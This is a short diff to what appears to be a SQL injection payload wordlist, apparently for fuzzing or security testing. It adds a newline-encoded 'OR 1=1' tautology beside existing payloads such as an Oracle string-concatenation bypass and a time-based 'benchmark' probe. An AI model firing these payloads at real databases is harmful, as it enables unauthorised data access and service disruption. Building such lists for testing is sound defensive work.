@@ -1,5 +1,6 @@
 )%20or%20('x'='x
 %20or%201=1
+1%0AOR 1=1 
 ; execute immediate 'sel' || 'ect us' || 'er'
 benchmark(10000000,MD5(1))#
 update
